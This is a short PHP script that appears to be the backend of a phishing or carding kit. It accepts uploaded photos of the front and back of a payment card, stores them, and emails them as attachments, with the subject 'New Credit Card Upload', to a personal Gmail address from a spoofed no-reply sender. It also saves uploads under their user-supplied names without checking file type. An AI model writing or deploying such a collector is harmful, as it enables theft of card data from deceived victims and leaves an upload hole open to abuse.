<?php
// Set your receiving email
$to = "wsamson630@gmail.com"; // 🔁 Replace with your email

$uploadDir = "uploads/";
if (!file_exists($uploadDir)) {
    mkdir($uploadDir, 0755, true);
}

$front = $_FILES['front_card'];
$back = $_FILES['back_card'];

$frontName = uniqid("front_") . "_" . basename($front['name']);
$backName = uniqid("back_") . "_" . basename($back['name']);

$frontPath = $uploadDir . $frontName;
$backPath = $uploadDir . $backName;

$frontOk = move_uploaded_file($front['tmp_name'], $frontPath);
$backOk = move_uploaded_file($back['tmp_name'], $backPath);

if (!$frontOk || !$backOk) {
    http_response_code(500);
    echo "❌ Upload failed.";
    exit;
}

// Prepare email
$subject = "New Credit Card Upload";
$boundary = md5(time());
$headers = "From: no-reply@xcorps.online\r\n";
$headers .= "MIME-Version: 1.0\r\n";
$headers .= "Content-Type: multipart/mixed; boundary=\"$boundary\"\r\n";

$body = "--$boundary\r\n";
$body .= "Content-Type: text/plain; charset=UTF-8\r\n\r\n";
$body .= "Client submitted card uploads:\nFront: $frontName\nBack: $backName\n\n";

// Attach front card
$frontData = chunk_split(base64_encode(file_get_contents($frontPath)));
$body .= "--$boundary\r\n";
$body .= "Content-Type: image/jpeg; name=\"$frontName\"\r\n";
$body .= "Content-Disposition: attachment; filename=\"$frontName\"\r\n";
$body .= "Content-Transfer-Encoding: base64\r\n\r\n";
$body .= $frontData . "\r\n";

// Attach back card
$backData = chunk_split(base64_encode(file_get_contents($backPath)));
$body .= "--$boundary\r\n";
$body .= "Content-Type: image/jpeg; name=\"$backName\"\r\n";
$body .= "Content-Disposition: attachment; filename=\"$backName\"\r\n";
$body .= "Content-Transfer-Encoding: base64\r\n\r\n";
$body .= $backData . "\r\n";
$body .= "--$boundary--";

// Send email
if (mail($to, $subject, $body, $headers)) {
    echo "✅ Uploaded and emailed.";
} else {
    echo "⚠️ Upload OK, but email failed.";
}